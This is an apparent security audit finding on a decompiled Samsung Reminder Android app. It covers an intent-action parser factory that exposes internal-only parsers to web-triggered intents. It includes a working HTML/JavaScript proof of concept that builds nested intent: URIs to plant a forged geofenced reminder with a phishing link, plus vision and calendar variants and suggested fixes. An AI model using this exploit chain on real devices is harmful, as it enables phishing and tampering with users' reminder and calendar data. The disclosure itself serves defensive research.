## [V-017] `m9.l` ShareIntentParserFactory â€” Attacker-Controlled Action Dispatches Internal Parsers (addLocationReminder / addVisionReminder / save_in_calendar)

**File:** `sources/m9/l.java` (all 45 lines); backing abstract class `sources/m9/k.java`; image-bag `sources/m9/j.java`
**Severity:** High â€” when reached via V-011 / V-015 / V-016 chain, an attacker picks an internal-only action and forces the matching parser to ingest attacker-controlled data as if it had come from a trusted Samsung widget or shortcut.
**Class of flaw:** CWE-441 (unintended proxy) + CWE-20 (action-string-based type confusion) â€” compounded by CWE-862 on every downstream parser that assumes a trusted origin.

### Summary
`m9.l.a(Context, Intent, String uuid)` is a parser-dispatch factory called unconditionally from `D.l` at D.java:599 (`m9.l.a(fVar, intent2, reminder.getUuid())` inside the share / `ReminderAddView` branch). It selects an `m9.k` subtype **solely** from `intent.getAction()`, `intent.getType()`, and two extras â€” no package/signature check, no origin verification:

```java
public static final k a(Context context, Intent intent, String uuid) {
    String action = intent.getAction();
    String type   = intent.getType();
    if ("android.intent.action.SEND".equals(action) && type != null)          return new b(...);
    if ("android.intent.action.SEND_MULTIPLE".equals(action) && type != null) return new b(...);
    if ("com.samsung.android.app.reminder.action.addLocationReminder".equals(action)
        || "com.samsung.android.app.reminder.action.requestPermissionAndAddLocationReminder".equals(action)) {
        c cVar = new c(context, intent, uuid);
        cVar.f42384l = -1;                      // "unset" sentinel for location-reminder flow
        return cVar;
    }
    if ("com.samsung.android.app.reminder.action.addVisionReminder".equals(action))              return new e(...);
    if ("com.samsung.android.app.reminder.action.requestNotificationPermission".equals(action))  return new d(...);
    if (intent.getBooleanExtra("save_in_calendar", false))                                       return new i(...);
    if (intent.getStringExtra("type") != null)                                                   return new g(...);
    return new h(...); // EmptyParser fallback
}
```

The four `com.samsung.android.app.reminder.action.*` actions are **not** declared in `AndroidManifest.xml` as exported intent filters â€” they are intended to be reached only by trusted internal shortcuts, Bixby capsules, or the Samsung widget. Because `m9.l.a` dispatches on them regardless of caller identity, the combination of:

1. **V-015 / V-016 Branch A** explicitly `setClass(activity, AddActivity.class)` and `putExtras(attackerIntent)` â€” propagating attacker's `action` into the freshly-built Intent.
2. **Or V-001** forwarding from `DetailActivity` â†’ `AddActivity` (where `D.l` runs against `getIntent()` with the full attacker action).

â€¦makes every one of these internal-only parsers reachable from a **one-click web attack**.

### Per-parser reachability consequences
- **`m9.c` (LocationShareIntentParser)** â€” triggered by `addLocationReminder` / `requestPermissionAndAddLocationReminder`. Typical implementations of this parser read latitude/longitude/radius from intent extras. Result: **attacker-forged geofenced reminder** that fires when the victim enters a location of the attacker's choosing. Useful for physical-presence-based phishing / social-engineering triggers.
- **`m9.e` (VisionShareIntentParser)** â€” triggered by `addVisionReminder`. Ingests attacker image URIs/OCR text and creates a reminder â€” second, more direct route to the V-006 scan-reminder pipeline without needing `service_action_type=100`.
- **`m9.d` (RequestNotificationPermissionParser)** â€” triggered by `requestNotificationPermission`. Causes the reminder app to prompt the user for `POST_NOTIFICATIONS` on the attacker's timing (UI confusion primitive).
- **`m9.i` (CalendarShareIntentParser)** â€” triggered by `save_in_calendar=true`. The "save reminder to the calendar app" path becomes addressable â€” attacker can smuggle calendar-bound reminder data that a subsequent calendar sync will treat as user-authored.
- **`m9.g` (TypedShareIntentParser)** â€” triggered by any non-null `type` extra. Attacker can steer into a branch merely by asserting a fake `type` string.

### Attacker capability (full chain)
Attacker serves a malicious page; user clicks once.
1. BROWSABLE `reminder://` intent hits `MainListActivity` (V-015).
2. `MainListActivity` â†’ `R1.g2` Branch A (V-016) forwards `.putExtras(attackerIntent).setClass(ctx, AddActivity)` â†’ `AddActivity.onCreate` â†’ `D.l(attackerIntent)`.
3. `D.l` line 577: `getStringExtra("popover_intent")` triggers the share/ReminderAddView branch, followed at line 599 by `m9.l.a(activity, intent2, reminder.getUuid())`.
4. Attacker's chosen `intent.action` selects the parser â€” **any of the six internal actions** above become usable.
5. The chosen parser consumes attacker extras and writes a reminder row carrying attacker-forged content, location, or image.

### Proof-of-Concept (one-click web â†’ forged location reminder)
```html
<a id="k" href=''>open reminder</a>
<script>
  // stage-2 Intent: no setPackage (bypasses V-008 null-pkg check in M.c)
  const stage2 =
    "intent:#Intent;" +
    "action=com.samsung.android.app.reminder.action.addLocationReminder;" +
    "component=com.samsung.android.app.reminder/com.samsung.android.app.reminder.ui.detail.add.AddActivity;" +
    "S.uuid=00000000-0000-0000-0000-000000000001;" +
    "S.title=Meet%20at%20Attacker%27s%20Cafe;" +
    "S.description=Tap%20this%20link%20on%20arrival%3A%20http%3A%2F%2Fevil%2Fphish;" +
    "d.lat=37.4219999;" +           // Google HQ coords as placeholder â€” attacker picks any
    "d.lng=-122.0840575;" +
    "d.radius=100;" +
    "end";
  document.getElementById('k').href =
    'intent://mainlist#Intent;scheme=reminder;' +
    'S.popover_intent=' + encodeURIComponent(stage2) + ';' +
    'B.add_reminder_from_share=true;' +
    'end';
</script>
```
Clicking this link triggers V-015 â†’ V-016 Branch A â†’ D.l â†’ `m9.l.a` â†’ `m9.c`. A reminder is created with action=`addLocationReminder`, uuid attacker-chosen, carrying attacker-controlled title/description/coords â€” it will fire on the victim when they physically enter the attacker's chosen geofence.

**Vision-reminder variant (attacker-forged OCR reminder):** same wrapper, swap `action=â€¦addVisionReminder` and include attacker image URIs.

**Calendar-write variant:** set `B.save_in_calendar=true` in the popover_intent URI â€” routes to `m9.i`.

### Root-cause fixes
1. In `m9.l.a`, require `getCallingPackage()` equality to `com.samsung.android.app.reminder` **or** require the Intent to have been dispatched via a signature-protected internal action. External callers should never reach the non-SEND branches.
2. Remove the pure-string action dispatch: use typed Parcelable extras and an internal `enum ShareKind` carried as a Parcelable rather than a global action namespace that attackers can forge.
3. For `m9.c`, validate that latitude/longitude fields come from a trusted Parcelable Samsung-provided type and not raw doubles/strings attacker can set.

